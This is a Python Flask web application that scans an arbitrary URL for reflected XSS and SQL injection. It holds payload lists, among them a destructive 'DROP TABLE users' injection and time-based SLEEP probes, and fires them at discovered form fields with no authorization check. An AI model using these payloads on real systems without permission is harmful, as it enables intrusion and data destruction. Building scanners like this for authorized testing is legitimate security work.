from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
from urllib.parse import urljoin, urlparse
import re
import time
from bs4 import BeautifulSoup
import threading
from queue import Queue

app = Flask(__name__)
CORS(app)

# XSS Payloads
XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror="alert(\'xss\')">',
    '<svg onload="alert(\'xss\')">',
    'javascript:alert("xss")',
    '<iframe src="javascript:alert(\'xss\')"></iframe>',
    '<body onload="alert(\'xss\')">',
    '<input onfocus="alert(\'xss\')" autofocus>',
    '<select onfocus="alert(\'xss\')" autofocus>',
    '<textarea onfocus="alert(\'xss\')" autofocus>',
    '<marquee onstart="alert(\'xss\')"></marquee>',
    '<details open ontoggle="alert(\'xss\')">',
    '\'><script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert(document.domain)>',
]

# SQLi Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or '1'='1",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "1; DROP TABLE users--",
    "' UNION ALL SELECT NULL,NULL--",
]

# SQL Error patterns
SQL_ERROR_PATTERNS = [
    r"SQL syntax",
    r"SQL error",
    r"Unclosed quotation",
    r"near ',",
    r"MySQL",
    r"PostgreSQL",
    r"MSSQL",
    r"ORA-\d+",
    r"Syntax error",
    r"SQLite",
    r"database error",
    r"invalid SQL",
]

def extract_forms(url, html_content):
    """Extract all forms from HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    
    for form in soup.find_all('form'):
        form_data = {
            'action': urljoin(url, form.get('action', '')),
            'method': form.get('method', 'GET').upper(),
            'fields': []
        }
        
        for input_field in form.find_all(['input', 'textarea', 'select']):
            field_name = input_field.get('name', '')
            field_type = input_field.get('type', 'text')
            if field_name:
                form_data['fields'].append({
                    'name': field_name,
                    'type': field_type
                })
        
        if form_data['fields']:
            forms.append(form_data)
    
    return forms

def extract_inputs(url, html_content):
    """Extract all input fields from HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    inputs = []
    
    for input_field in soup.find_all(['input', 'textarea', 'select']):
        name = input_field.get('name', '')
        if name:
            inputs.append({
                'name': name,
                'type': input_field.get('type', 'text')
            })
    
    return inputs

def test_xss(url, payload, param_name, method='GET'):
    """Test for XSS vulnerability"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        if method == 'GET':
            params = {param_name: payload}
            response = requests.get(url, params=params, headers=headers, timeout=5, allow_redirects=True)
        else:
            data = {param_name: payload}
            response = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=True)
        
        # Check if payload is reflected in response
        if payload in response.text or payload.replace('"', '&quot;') in response.text:
            return {'vulnerable': True, 'payload': payload, 'type': 'Reflected XSS'}
        
        # Check for decoded versions
        if '<script>' in response.text and 'alert' in response.text:
            return {'vulnerable': True, 'payload': payload, 'type': 'Reflected XSS'}
    
    except Exception as e:
        pass
    
    return {'vulnerable': False}

def test_sqli(url, payload, param_name, method='GET'):
    """Test for SQLi vulnerability"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        if method == 'GET':
            params = {param_name: payload}
            response = requests.get(url, params=params, headers=headers, timeout=5, allow_redirects=True)
        else:
            data = {param_name: payload}
            response = requests.post(url, data=data, headers=headers, timeout=5, allow_redirects=True)
        
        # Check for SQL error messages
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {'vulnerable': True, 'payload': payload, 'type': 'Error-based SQLi', 'error': pattern}
        
        # Check for UNION SELECT
        if 'UNION' in payload and any(keyword in response.text for keyword in ['column', 'table', 'database']):
            return {'vulnerable': True, 'payload': payload, 'type': 'UNION-based SQLi'}
    
    except Exception as e:
        pass
    
    return {'vulnerable': False}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def scan():
    """Main scanning endpoint"""
    data = request.json
    target_url = data.get('url', '').strip()
    scan_type = data.get('type', 'both')  # both, xss, sqli
    
    # Validate URL
    try:
        parsed = urlparse(target_url)
        if not parsed.scheme:
            target_url = 'http://' + target_url
        
        # Ping to check if URL is accessible
        response = requests.head(target_url, timeout=5, allow_redirects=True)
    except Exception as e:
        return jsonify({'error': f'Cannot reach URL: {str(e)}'}), 400
    
    results = {
        'url': target_url,
        'xss_vulnerabilities': [],
        'sqli_vulnerabilities': [],
        'status': 'scanning',
        'total_tests': 0
    }
    
    try:
        # Get the main page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        main_response = requests.get(target_url, headers=headers, timeout=5, allow_redirects=True)
        html_content = main_response.text
        
        # Extract forms and input fields
        forms = extract_forms(target_url, html_content)
        inputs = extract_inputs(target_url, html_content)
        
        # If no forms found, try common parameter names
        if not inputs and not forms:
            common_params = ['q', 'search', 'id', 'name', 'email', 'username', 'password', 'comment']
            inputs = [{'name': param, 'type': 'text'} for param in common_params]
        
        # Testing parameters
        test_params = []
        
        # From forms
        for form in forms:
            test_params.extend(form['fields'])
        
        # Direct inputs
        test_params.extend(inputs)
        
        # Remove duplicates
        test_params = list({p['name']: p for p in test_params}.values())
        
        # XSS Testing
        if scan_type in ['xss', 'both']:
            for param in test_params:
                for payload in XSS_PAYLOADS:
                    result = test_xss(target_url, payload, param['name'], 'GET')
                    if result['vulnerable']:
                        results['xss_vulnerabilities'].append({
                            'parameter': param['name'],
                            'payload': result['payload'],
                            'type': result['type'],
                            'severity': 'High'
                        })
                    results['total_tests'] += 1
                    time.sleep(0.1)  # Rate limiting
        
        # SQLi Testing
        if scan_type in ['sqli', 'both']:
            for param in test_params:
                for payload in SQLI_PAYLOADS:
                    result = test_sqli(target_url, payload, param['name'], 'GET')
                    if result['vulnerable']:
                        results['sqli_vulnerabilities'].append({
                            'parameter': param['name'],
                            'payload': result['payload'],
                            'type': result['type'],
                            'severity': 'Critical'
                        })
                    results['total_tests'] += 1
                    time.sleep(0.1)  # Rate limiting
        
        results['status'] = 'completed'
        results['vulnerable_found'] = len(results['xss_vulnerabilities']) + len(results['sqli_vulnerabilities'])
        
        return jsonify(results)
    
    except Exception as e:
        results['status'] = 'error'
        results['error'] = str(e)
        return jsonify(results), 500

@app.route('/api/quick-scan', methods=['POST'])
def quick_scan():
    """Quick scan for basic vulnerabilities"""
    data = request.json
    target_url = data.get('url', '').strip()
    
    try:
        parsed = urlparse(target_url)
        if not parsed.scheme:
            target_url = 'http://' + target_url
        
        response = requests.head(target_url, timeout=5, allow_redirects=True)
    except Exception as e:
        return jsonify({'error': f'Cannot reach URL: {str(e)}'}), 400
    
    results = {
        'url': target_url,
        'security_headers': {},
        'vulnerabilities': []
    }
    
    try:
        main_response = requests.get(target_url, timeout=5, allow_redirects=True)
        
        # Check security headers
        security_headers = [
            'Content-Security-Policy',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'X-XSS-Protection'
        ]
        
        for header in security_headers:
            if header in main_response.headers:
                results['security_headers'][header] = 'Present'
            else:
                results['security_headers'][header] = 'Missing'
                results['vulnerabilities'].append({
                    'type': 'Missing Security Header',
                    'header': header,
                    'severity': 'Medium'
                })
        
        return jsonify(results)
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
